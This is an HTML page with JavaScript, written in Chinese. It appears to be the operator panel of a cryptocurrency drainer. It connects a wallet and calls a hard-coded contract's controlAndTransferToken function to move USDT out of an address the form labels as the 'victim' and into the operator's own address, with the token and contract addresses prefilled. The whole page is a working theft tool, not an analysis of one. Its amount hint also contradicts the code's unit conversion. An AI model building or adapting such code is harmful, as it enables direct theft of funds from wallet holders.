<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>调用合约 - Owner 工具</title>
  <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
  <style>
    body { 
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
      padding: 20px; 
      background: #f8f9fa; 
      margin: 0; 
    }
    .container { 
      max-width: 560px; 
      margin: 0 auto; 
      background: white; 
      padding: 24px; 
      border-radius: 12px; 
      box-shadow: 0 4px 20px rgba(0,0,0,0.08); 
    }
    h2 { 
      margin-top: 0; 
      color: #333; 
      font-size: 1.5rem; 
      text-align: center; 
    }
    label { 
      display: block; 
      margin: 16px 0 6px; 
      font-weight: 600; 
      color: #444; 
    }
    input, textarea { 
      width: 100%; 
      padding: 10px 12px; 
      font-size: 16px; 
      border: 1px solid #ddd; 
      border-radius: 6px; 
      box-sizing: border-box; 
    }
    input[readonly] { 
      background: #f1f3f5; 
      color: #666; 
    }
    button { 
      margin-top: 24px; 
      width: 100%; 
      background: #1e88e5; 
      color: white; 
      border: none; 
      padding: 14px; 
      font-size: 17px; 
      font-weight: 600; 
      border-radius: 8px; 
      cursor: pointer; 
    }
    button:hover { 
      background: #1565c0; 
    }
    button:disabled { 
      background: #ccc; 
      cursor: not-allowed; 
    }
    #status { 
      margin-top: 20px; 
      padding: 12px; 
      background: #f8f9fa; 
      border-radius: 6px; 
      white-space: pre-wrap; 
      word-break: break-all; 
      font-size: 14px; 
      line-height: 1.5; 
      color: #333; 
    }
    .tip {
      font-size: 13px;
      color: #666;
      margin-top: 4px;
    }
  </style>
</head>
<body>

<div class="container">
  <h2>调用合约函数（Owner 专用）</h2>

  <label>合约地址（已填写）</label>
  <input id="contractAddr" value="0x8e01632dae54Ca7Dc86696ee577Cf0127dfDD941" readonly>

  <label>USDT 地址（已填写）</label>
  <input id="tokenAddr" value="0x55d398326f99059fF775485246999027B3197955" readonly>

  <label>受害者地址 (from)</label>
  <input id="fromAddr" placeholder="0x...">

  <label>转到地址 (to) — 一般填自己</label>
  <input id="toAddr" placeholder="0x...">

  <label>提取数量 (amount)</label>
  <input id="amount" placeholder="1000000000000000000000 = 1000 USDT">
  <div class="tip">注意单位：1 USDT = 1000000000000000000 (18 decimals)</div>

  <button onclick="callContract()">执行调用</button>

  <div id="status"></div>
</div>

<script>
async function callContract() {
  const status = document.getElementById("status");
  status.innerHTML = "正在连接钱包...";

  if (!window.ethereum) {
    status.innerHTML = "请在 TokenPocket 或支持 WalletConnect 的钱包中打开此页面";
    return;
  }

  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = provider.getSigner();
    const myAddress = await signer.getAddress();

    status.innerHTML = `已连接：${myAddress.slice(0,6)}...${myAddress.slice(-4)}<br>正在准备调用...`;

    const contractAddr = document.getElementById("contractAddr").value.trim();
    const ABI = [
      "function controlAndTransferToken(address tokenAddress, address from, address to, uint256 amount) public"
    ];

    const contract = new ethers.Contract(contractAddr, ABI, signer);

    const tokenAddr = document.getElementById("tokenAddr").value.trim();
    const fromAddr  = document.getElementById("fromAddr").value.trim();
    const toAddr    = document.getElementById("toAddr").value.trim();
    const amountStr = document.getElementById("amount").value.trim();

    if (!fromAddr || !toAddr || !amountStr) {
      throw new Error("请完整填写所有字段");
    }

    let amount;
    try {
      amount = ethers.utils.parseUnits(amountStr, 18);
    } catch (e) {
      throw new Error("金额格式错误，请输入正确的数字");
    }

    status.innerHTML += `<br><br>准备调用参数：\nFrom: ${fromAddr}\nTo: ${toAddr}\nAmount: ${ethers.utils.formatUnits(amount, 18)} USDT`;

    const tx = await contract.controlAndTransferToken(
      tokenAddr,
      fromAddr,
      toAddr,
      amount,
      { gasLimit: 300000 }  // 可根据实际需要调整
    );

    status.innerHTML = `交易已发送！<br>Hash: ${tx.hash}<br>请在钱包确认并等待上链...`;

    await tx.wait();
    status.innerHTML = `调用成功！<br>交易已确认。<br>Hash: ${tx.hash}`;

  } catch (e) {
    let msg = e.reason || e.message || "未知错误";

    if (msg.includes("user rejected")) {
      msg = "用户已取消交易";
    } else if (msg.includes("insufficient funds")) {
      msg = "余额不足以支付 gas 费用";
    } else if (msg.includes("execution reverted")) {
      msg = "合约执行失败（可能权限不足或参数错误）";
    }

    status.innerHTML = `失败：\n${msg}`;
    console.error(e);
  }
}
</script>

</body>
</html>